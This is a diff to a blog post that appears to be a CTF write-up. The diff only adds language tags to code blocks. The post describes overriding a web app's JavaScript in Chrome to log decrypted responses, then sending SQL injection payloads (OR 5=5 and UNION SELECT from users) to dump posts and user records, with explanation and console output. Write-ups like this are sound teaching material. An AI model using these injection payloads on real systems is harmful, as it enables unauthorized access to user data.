@@ -45,14 +45,14 @@ You have to enable overriding support first in Google Chrome (no idea about Fire
 Then, you need to right click on the tab (`main.js` in this case) and you'll see `Save for overrides`. Press that, and you're ready!
 
 While overriding, `console.log()` is your friend. Use it everywhere and see what's happening. I saw a function that decrypted the received data and I added my `console.log()` there:
-```
+``` javascript
 const e = JSON.parse(i.utils.utf8.fromBytes(i.padding.pkcs7.strip(u.decrypt(t))));
 console.log(e);
 ```
 ![Console Output](/images/console-output-hprtcpctf.png)
 
 Cool! Now it printed everything! Now, I had to modify the sent requests. Just below the above line, there was:
-```
+``` javascript
 if ("success" === e) {
     const t = parseInt(window.location.hash.substr(1));
     if (!isNaN(t))
@@ -67,12 +67,12 @@ And I found just what I wanted: a method to send data. In this case, it was gett
 ### SQL Injection
 
 To ensure I could do a  SQL Injection attack, I made it:
-```
+``` javascript
 r.send(o.encode(["getPost", "1 OR 5=5;--"]));
 ```
 
 And yes, it worked! I got all the posts on the site. Output of `console.log`:
-```
+``` javascript
 (3) ["post", "1 OR 2=2;--", Array(2)]
 0: "post"
 1: "1 OR 2=2;--"
@@ -88,7 +88,7 @@ Explanation: I assumed the SQL statement was something like `SELECT * FROM posts
 So, my input made it: `SELECT * FROM posts WHERE id=1 OR 5=5;--`. Select everything from table posts where ID is 1 or 5=5 (which evaluates to True), aka fetch all posts. `;--` skips whatever is at the end, and terminates the query.
 
 After that, I used `UNION` to join another `SELECT` query to get user information. In `UNION`, you have to make sure the number of columns match and hence the `1,1` thing:
-```
+``` javascript
 r.send(o.encode(["getPost", "1 OR 2=2 UNION SELECT *,1,1,0 from users;--"]));
 ```
 
@@ -98,7 +98,7 @@ First I did `UNION SELECT 1,1,1,1,1,1` but that didn't work cause the last varia
 Then I tried to get table names from `information_schema.tables` but that wasn't working. I tried to use some "common" table names and `users` worked. Then I did `UNION SELECT *,0 from users;--`, and kept adding `,1` till it worked. (Remember, `UNION` means same number of columns)
 
 Here was the output:
-```
+``` javascript
 (3) ["post", "1 OR 2=2 UNION SELECT *,1,1,0 from users;--", Array(4)]
 0: "post"
 1: "1 OR 2=2 UNION SELECT *,1,1,0 from users;--"
